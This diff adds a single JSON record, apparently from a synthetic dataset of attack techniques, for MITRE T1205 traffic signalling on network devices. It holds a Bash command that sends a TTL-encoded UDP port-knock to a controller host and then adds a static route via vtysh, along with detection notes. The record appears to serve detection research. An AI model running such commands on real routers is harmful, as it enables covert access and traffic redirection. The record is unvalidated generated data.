@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "sudo bash -c 'python3 -c \"from scapy.all import IP,UDP,send; dst=\\\"198.51.100.30\\\"; seq=[(48888,64),(48889,65),(48890,66)]; [send(IP(dst=dst,ttl=t)/UDP(dport=p),verbose=False) for p,t in seq]\"; vtysh -c \"conf t\" -c \"ip route 100.64.0.0/10 198.51.100.30\"'",
+  "explanation": "Sends a TTL-encoded UDP knocking sequence to a controller (ports 48888-48890 with TTLs 64,65,66) as a magic signal, then adds a route via vtysh to utilize the opened path. Detection: profile unusual TTL patterns to fixed destinations and verify unexpected routing changes.",
+  "rationale_steps": [
+    "Craft UDP probes with specific TTL values to encode a covert multi-step knock.",
+    "Assuming the remote unlocks access, add a static route pointing at the controller.",
+    "Detect via NetFlow/sFlow with TTL distribution analysis and FRR route table monitoring."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-e71f7f24-23bc0ef8",
+  "source_prompt_hash": "e71f7f24",
+  "timestamp_utc": "2025-09-30T06:04:49.943820Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
